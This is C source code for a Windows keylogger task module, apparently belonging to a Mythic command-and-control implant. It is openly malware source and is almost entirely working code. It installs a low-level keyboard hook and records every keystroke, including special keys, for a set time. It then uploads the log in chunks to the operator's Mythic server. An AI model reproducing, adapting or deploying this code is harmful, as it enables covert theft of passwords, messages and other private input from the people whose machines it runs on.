#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#include "Parser.h"
#include "Package.h"
#include "Task.h"
#include "Config.h"
#include "Tasks/Keylogger.h"

#ifdef INCLUDE_CMD_KEYLOGGER

#define CHUNK_SIZE 512000      // 512 KB
#define MAX_LOG_SIZE 1048576   // 1 MB max log buffer

// Globals pour hook et log
static HHOOK g_hKeyboardHook = NULL;
static char* g_logBuffer = NULL;
static size_t g_logSize = 0;
static size_t g_logCapacity = 0;
static CRITICAL_SECTION g_csLog;  // Pour thread-safety

// Callback du hook clavier
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbStruct->vkCode;
        char output[16] = {0};  // Buffer pour char ou [KEY]

        // Ignorer les modificateurs seuls (Shift, Ctrl, Alt, Caps toggle)
        if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT ||
            vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL ||
            vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU ||
            vkCode == VK_CAPITAL) {
            return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
        }

        // Touches spéciales (non-modificateurs)
        switch (vkCode) {
            case VK_BACK: strcpy(output, "[BACKSPACE]"); break;
            case VK_RETURN: strcpy(output, "[ENTER]"); break;
            case VK_SPACE: strcpy(output, " "); break;
            case VK_TAB: strcpy(output, "[TAB]"); break;
            case VK_ESCAPE: strcpy(output, "[ESC]"); break;
            case VK_LEFT: strcpy(output, "[LEFT]"); break;
            case VK_RIGHT: strcpy(output, "[RIGHT]"); break;
            case VK_UP: strcpy(output, "[UP]"); break;
            case VK_DOWN: strcpy(output, "[DOWN]"); break;
            case VK_HOME: strcpy(output, "[HOME]"); break;
            case VK_END: strcpy(output, "[END]"); break;
            case VK_DELETE: strcpy(output, "[DELETE]"); break;
            case VK_INSERT: strcpy(output, "[INSERT]"); break;
            case VK_PRIOR: strcpy(output, "[PGUP]"); break;
            case VK_NEXT: strcpy(output, "[PGDN]"); break;
            case VK_F1: strcpy(output, "[F1]"); break;
            case VK_F2: strcpy(output, "[F2]"); break;
            case VK_F3: strcpy(output, "[F3]"); break;
            case VK_F4: strcpy(output, "[F4]"); break;
            case VK_F5: strcpy(output, "[F5]"); break;
            case VK_F6: strcpy(output, "[F6]"); break;
            case VK_F7: strcpy(output, "[F7]"); break;
            case VK_F8: strcpy(output, "[F8]"); break;
            case VK_F9: strcpy(output, "[F9]"); break;
            case VK_F10: strcpy(output, "[F10]"); break;
            case VK_F11: strcpy(output, "[F11]"); break;
            case VK_F12: strcpy(output, "[F12]"); break;
            default: {
                // Récupérer le layout clavier du thread courant pour AZERTY FR
                HKL hkl = GetKeyboardLayout(GetCurrentThreadId());

                // Pour touches normales : ToUnicodeEx avec layout explicite
                BYTE keyState[256] = {0};
                GetKeyboardState(keyState);

                // Mettre à jour l'état des touches de modification
                keyState[VK_SHIFT] = GetKeyState(VK_SHIFT) & 0x80 ? 0x80 : 0;
                keyState[VK_LSHIFT] = GetKeyState(VK_LSHIFT) & 0x80 ? 0x80 : 0;
                keyState[VK_RSHIFT] = GetKeyState(VK_RSHIFT) & 0x80 ? 0x80 : 0;
                keyState[VK_CONTROL] = GetKeyState(VK_CONTROL) & 0x80 ? 0x80 : 0;
                keyState[VK_LCONTROL] = GetKeyState(VK_LCONTROL) & 0x80 ? 0x80 : 0;
                keyState[VK_RCONTROL] = GetKeyState(VK_RCONTROL) & 0x80 ? 0x80 : 0;
                keyState[VK_MENU] = GetKeyState(VK_MENU) & 0x80 ? 0x80 : 0;
                keyState[VK_LMENU] = GetKeyState(VK_LMENU) & 0x80 ? 0x80 : 0;
                keyState[VK_RMENU] = GetKeyState(VK_RMENU) & 0x80 ? 0x80 : 0;
                keyState[VK_CAPITAL] = GetKeyState(VK_CAPITAL) & 0x01 ? 0x01 : 0;

                WCHAR sb[5] = {0};
                int result = ToUnicodeEx((UINT)vkCode, kbStruct->scanCode, keyState, sb, 5, 0, hkl);
                if (result > 0) {
                    WideCharToMultiByte(CP_UTF8, 0, sb, (int)wcslen(sb), output, sizeof(output), NULL, NULL);
                } else {
                    sprintf(output, "[%ld]", vkCode);
                }
                break;
            }
        }

        // Ajouter au buffer log (thread-safe)
        EnterCriticalSection(&g_csLog);
        size_t len = strlen(output);
        if (g_logSize + len + 1 < g_logCapacity) {
            strcat(g_logBuffer + g_logSize, output);
            g_logSize += len;
        } else {
            // Buffer plein : tronque ou ignore
            _err("Log buffer overflow");
        }
        LeaveCriticalSection(&g_csLog);
    }

    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

// Fonction pour capturer les frappes et retourner le buffer
static BOOL CaptureKeylog(int seconds, unsigned char** out_buf, uint32_t* out_size) {
    InitializeCriticalSection(&g_csLog);

    // Allouer buffer log
    g_logCapacity = MAX_LOG_SIZE;
    g_logBuffer = (char*)malloc(g_logCapacity);
    if (!g_logBuffer) {
        DeleteCriticalSection(&g_csLog);
        return FALSE;
    }
    g_logBuffer[0] = '\0';
    g_logSize = 0;

    // Installer hook
    g_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (!g_hKeyboardHook) {
        free(g_logBuffer);
        DeleteCriticalSection(&g_csLog);
        return FALSE;
    }

    // Boucle message pour garder hook actif
    MSG msg;
    DWORD startTime = GetTickCount();
    DWORD endTime = startTime + (seconds * 1000);

    while (GetTickCount() < endTime) {
        if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        } else {
            Sleep(10);  // Éviter surcharge CPU
        }
    }

    // Désinstaller hook
    UnhookWindowsHookEx(g_hKeyboardHook);
    g_hKeyboardHook = NULL;

    // Préparer le buffer de sortie
    *out_buf = (unsigned char*)g_logBuffer;
    *out_size = (uint32_t)g_logSize;

    DeleteCriticalSection(&g_csLog);
    return TRUE;
}

/**
 * @brief Initialize a keylog file download and return file UUID.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] download KEYLOGGER_DOWNLOAD struct which contains details of the keylog
 * @return DWORD
 */
DWORD KeyloggerInit(_In_ PCHAR taskUuid, _Inout_ PKEYLOGGER_DOWNLOAD download) {
    DWORD Status = 0;

    // Calculate total chunks (rounded up)
    download->totalChunks = (DWORD)((download->keylog_size + CHUNK_SIZE - 1) / CHUNK_SIZE);

    // Prepare package
    PPackage data = PackageInit(DOWNLOAD_INIT, TRUE);
    PackageAddString(data, taskUuid, FALSE);
    PackageAddInt32(data, download->totalChunks);
    PackageAddString(data, download->filepath, TRUE);
    PackageAddInt32(data, CHUNK_SIZE);
    PackageAddByte(data, 0); // is_screenshot = False

    // Send package
    PARSER Response = { 0 };
    PackageSend(data, &Response);

    BYTE status = ParserGetByte(&Response);
    if (status == FALSE) {
        _err("KeyloggerInit returned failure status: 0x%hhx", status);
        Status = ERROR_MYTHIC_DOWNLOAD;
        goto end;
    }

    SIZE_T lenUuid = TASK_UUID_SIZE;
    PCHAR uuid = ParserGetString(&Response, &lenUuid);
    if (uuid == NULL) {
        _err("Failed to get UUID from response.");
        Status = ERROR_MYTHIC_DOWNLOAD;
        goto end;
    }

    strncpy(download->fileUuid, uuid, TASK_UUID_SIZE + 1);
    download->fileUuid[TASK_UUID_SIZE + 1] = '\0'; // null-termination

end:
    if (data) PackageDestroy(data);
    if (&Response) ParserDestroy(&Response);

    return Status;
}

/**
 * @brief Send chunks of the keylog file to Mythic server
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] download KEYLOGGER_DOWNLOAD struct which contains details of the keylog
 * @return DWORD
 */
DWORD KeyloggerContinue(_In_ PCHAR taskUuid, _Inout_ PKEYLOGGER_DOWNLOAD download) {
    DWORD Status = 0;
    char* chunkBuffer = (char*)LocalAlloc(LPTR, CHUNK_SIZE);

    if (!chunkBuffer) {
        DWORD error = GetLastError();
        _err("Memory allocation failed. ERROR CODE: %d", error);
        goto cleanup;
    }

    download->currentChunk = 1;

    DWORD remaining = download->keylog_size;
    while (download->currentChunk <= download->totalChunks) {
        DWORD bytesRead = 0;
        if (remaining < CHUNK_SIZE)
            bytesRead = remaining;
        else
            bytesRead = CHUNK_SIZE;

        _dbg("Sending chunk %d/%d (size: %d)", download->currentChunk, download->totalChunks, bytesRead);

        // Prepare package
        PPackage cur = PackageInit(DOWNLOAD_CONTINUE, TRUE);
        PackageAddString(cur, taskUuid, FALSE);
        PackageAddInt32(cur, download->currentChunk);
        PackageAddBytes(cur, download->fileUuid, TASK_UUID_SIZE, FALSE);
        PackageAddBytes(cur, download->keylog_data + (download->currentChunk-1)*CHUNK_SIZE, bytesRead, TRUE);
        PackageAddInt32(cur, bytesRead);

        remaining -= bytesRead;

        // Send chunk
        PARSER Response = { 0 };
        PackageSend(cur, &Response);

        BYTE success = ParserGetByte(&Response);
        if (success == FALSE) {
            _err("Download chunk %d failed.", download->currentChunk);
            Status = ERROR_MYTHIC_DOWNLOAD;
            PackageDestroy(cur);
            ParserDestroy(&Response);
            goto cleanup;
        }

        download->currentChunk++;

        PackageDestroy(cur);
        ParserDestroy(&Response);
    }

cleanup:
    if (chunkBuffer) LocalFree(chunkBuffer);

    return Status;
}

/**
 * @brief Main command function for keylogging.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[in] arguments Parser with given task data buffer
 * @return VOID
 */
VOID Keylogger(_In_ PCHAR taskUuid, _In_ PPARSER arguments) {
    DWORD status;
    KEYLOGGER_DOWNLOAD kd = { 0 };

    UINT32 nbArg = ParserGetInt32(arguments);
    if (nbArg == 0) {
        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
        return;
    }

    // Perform the keylogging
    UINT32 seconds = ParserGetInt32(arguments);
    unsigned char* keylog = NULL;
    uint32_t keylog_size = 0;

    BOOL success = CaptureKeylog(seconds, &keylog, &keylog_size);
    if (!success || keylog_size == 0) {
        PackageError(taskUuid, ERROR_INVALID_HANDLE);
        if (keylog) free(keylog);
        return;
    }

    kd.keylog_data = keylog;
    kd.keylog_size = keylog_size;
    strncpy(kd.filepath, "keylog.txt", MAX_PATH);

    // Prepare to send
    status = KeyloggerInit(taskUuid, &kd);
    if (status != 0) {
        PackageError(taskUuid, status);
        if (keylog) free(keylog);
        return;
    }

    _dbg("Sending keylog FilePath:\"%s\" - ID:%s", kd.filepath, kd.fileUuid);

    // Transfer chunked file
    status = KeyloggerContinue(taskUuid, &kd);
    if (status != 0) {
        PackageError(taskUuid, status);
        if (keylog) free(keylog);
        return;
    }

    PackageComplete(taskUuid, NULL);

    // Cleanup
    if (keylog) free(keylog);
}

/**
 * @brief Thread entrypoint for Keylogger function.
 * 
 * @param[in] lpTaskParameter Structure that holds task-related data (taskUuid, taskParser)
 * @return DWORD WINAPI
 */
DWORD WINAPI KeyloggerThread(_In_ LPVOID lpTaskParameter) {
    _dbg("Keylogger Thread started.");

    TASK_PARAMETER* tp = (TASK_PARAMETER*)lpTaskParameter;

    Keylogger(tp->TaskUuid, tp->TaskParser);

    _dbg("Keylogger Thread cleaning up now...");
    // Cleanup
    free(tp->TaskUuid);
    ParserDestroy(tp->TaskParser);
    LocalFree(tp);
    return 0;
}

#endif // INCLUDE_CMD_KEYLOGGER